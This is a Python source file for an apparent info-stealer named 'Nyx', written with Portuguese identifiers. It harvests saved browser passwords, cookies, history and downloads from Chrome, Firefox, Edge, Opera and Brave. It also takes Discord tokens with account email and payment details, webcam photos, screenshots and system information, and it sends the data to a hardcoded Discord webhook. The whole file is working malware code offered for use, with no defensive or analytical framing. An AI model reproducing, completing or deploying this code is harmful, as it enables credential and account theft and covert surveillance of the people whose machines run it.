import subprocess
import requests
import os
import json
import sys
from plugins.systeminfo import obter_informacoes_sistema
from plugins.discordtoken import TokenExtractor
from plugins.webcam import capture_photo
from plugins.userinfo import UserInfos
from plugins.operationsystem import get_os_info
from plugins.password import PasswordExtractor
from plugins.downloads import BrowserDownloadsExtractor
from plugins.history import BrowserDataExtractor
from plugins.cookies import CookieExtractor
from plugins.print import Sprint, save_image
from datetime import datetime
from multiprocessing import freeze_support

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
webhook_username = "Nyxbot"

appdata_local = os.getenv('LOCALAPPDATA')
pasta_nyx = os.path.join(appdata_local, 'Nyx')
if not os.path.exists(pasta_nyx):
    os.makedirs(pasta_nyx)

def load_config():
    config_path = os.path.join(sys._MEIPASS, 'config.json') if hasattr(sys, '_MEIPASS') else 'config.json'
    with open(config_path, 'r') as f:
        return json.load(f)

executou_informacoes_sistema = False
executou_discord_info = False
executou_webcam_foto = False
executou_screenshot = False
executou_password_extractor = False
executou_browser_downloads = False
executou_browser_history = False
executou_cookie_extractor = False

def executar_comando(comando):
    try:
        resultado = subprocess.check_output(comando, shell=True, text=True)
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Erro ao executar o comando: {e}"

def enviar_imagem_para_discord(caminho_foto):
    with open(caminho_foto, 'rb') as imagem:
        files = {'file': imagem}
        payload = {
            'username': webhook_username,
            'avatar_url': webhook_avatar,
        }
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        if response.status_code != 200:
            print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

def enviar_para_discord(mensagem, embed=None):
    payload = {
        'username': webhook_username,
        'avatar_url': webhook_avatar
    }
    
    if embed:
        payload['embeds'] = [embed]
    else:
        payload['content'] = mensagem

    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code != 204:
        print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

def executar_password_extractor():
    global executou_password_extractor
    if not executou_password_extractor:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = PasswordExtractor(navegador_convertido)
                passwords = extractor.get_passwords()

                if passwords:
                    passwords_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_passwords.txt")
                    extractor.save_passwords_to_file(passwords, passwords_file_path)

            executou_password_extractor = True
        except Exception as e:
            print(f"Erro ao executar PasswordExtractor: {e}")

def executar_browser_downloads():
    global executou_browser_downloads
    if not executou_browser_downloads:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = BrowserDownloadsExtractor(navegador_convertido)
                downloads = extractor.get_downloads()

                if downloads:
                    downloads_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_downloads.txt")
                    extractor.save_downloads_to_file(downloads, downloads_file_path)

            executou_browser_downloads = True
        except Exception as e:
            print(f"Erro ao executar BrowserDownloadsExtractor: {e}")

def executar_browser_history():
    global executou_browser_history
    if not executou_browser_history:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = BrowserDataExtractor(navegador_convertido)
                history = extractor.get_history()

                if history:
                    history_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_history.txt")
                    extractor.save_history_to_file(history, history_file_path)

            executou_browser_history = True
        except Exception as e:
            print(f"Erro ao executar BrowserDataExtractor: {e}")

def executar_cookie_extractor():
    global executou_cookie_extractor
    if not executou_cookie_extractor:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = CookieExtractor(navegador_convertido)
                cookies = extractor.get_cookies()

                if cookies:
                    cookies_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_cookies.txt")
                    extractor.save_cookies_to_file(cookies, cookies_file_path)

            executou_cookie_extractor = True
        except Exception as e:
            print(f"Erro ao executar CookieExtractor: {e}")

def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
    return {
        'title': 'Fotos',
        'description': 'Capturas de tela e foto da webcam',
        'color': 0xFF8C00,
        'fields': [
            {
                'name': 'Screenshot',
                'value': '![Screenshot](attachment://prtscr.png)',
                'inline': True
            },
            {
                'name': 'Foto da Webcam',
                'value': '![Webcam](attachment://webcam_foto.jpg)',
                'inline': True
            }
        ],\
        'image': {
            'url': 'attachment://webcam_foto.jpg'
        }
    }

if __name__ == "__main__":
    freeze_support()

    cfg = load_config()

    try:
        if cfg.get("user_info", False):
            user_info_instance = UserInfos()
            user_info = user_info_instance.get_user_info()
            user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
            user_info_embed = {
            'title': 'Informações do Usuário',
            'description': f'```\n{user_info_message}\n```',
            'color': 0x0000FF
            }
            enviar_para_discord('', embed=user_info_embed)

        if cfg.get("os_info", False):
            os_info = get_os_info()
            os_embed = {
                'title': 'Informações do Sistema Operacional',
                'description': f'```\n{os_info}\n```',
                'color': 0xFF0000
            }
            enviar_para_discord('', embed=os_embed)    
    
        if not executou_informacoes_sistema and cfg.get("system_info", False):
            informacoes_sistema = obter_informacoes_sistema()
            executou_informacoes_sistema = True
            sistema_embed = {
            'title': 'Informações do Sistema',
            'description': f'```\n{informacoes_sistema}\n```',
            'color': 0x00FF00
            }
            enviar_para_discord('', embed=sistema_embed)

        if not executou_discord_info and cfg.get("discord_info", False) :
            discord_info = TokenExtractor()
            discord_info.extract_tokens()
            executou_discord_info = True
            for token in discord_info.tokens:
                user_data = discord_info.get_user_data(token)
                if user_data:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
                    
                    discord_embed = {
                        'title': 'Informações do Discord',
                        'description': f"Nome de usuário: {user_data['username']}\n"
                                    f"E-mail: {user_data.get('email', 'Não disponível')}\n"
                                    f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
                                    f"Token: `{token}`",
                        'color': 0xFF0000,
                        'thumbnail': {
                            'url': avatar_url
                        }
                    }

                    payment_sources = discord_info.get_payment_sources(token)
                    if payment_sources:
                        discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
                    else:
                        discord_embed['description'] += "\nNenhum cartão de crédito registrado"

                    subscriptions = discord_info.get_nitro_subscription(token)
                    if subscriptions:
                        for sub in subscriptions:
                            renew_timestamp = sub.get("current_period_end")
                            if renew_timestamp:
                                expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
                                discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
                            else:
                                discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"

                    enviar_para_discord('', embed=discord_embed)
        


        if not executou_webcam_foto and cfg.get("webcam_photo", False):
            webcam_foto = capture_photo()
            executou_webcam_foto = True
            webcam_path = os.path.join(pasta_nyx, 'webcam_foto.jpg')
            enviar_imagem_para_discord(webcam_path)
        
        if not executou_screenshot and cfg.get("screenshot", False):
            screenshot = Sprint()
            screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
            save_image(screenshot, screenshot_path)
            executou_screenshot = True
            if os.path.exists(screenshot_path):
                enviar_imagem_para_discord(screenshot_path)


        if cfg.get("password", False):
            executar_password_extractor()

        if cfg.get("browser_downloads", False):
            executar_browser_downloads()
        
        if cfg.get("browser_history", False):
            executar_browser_history()

        if cfg.get("cookies", False):
            executar_cookie_extractor()

    except Exception as e:
        print(f"Ocorreu um erro durante a execução do script: {e}")
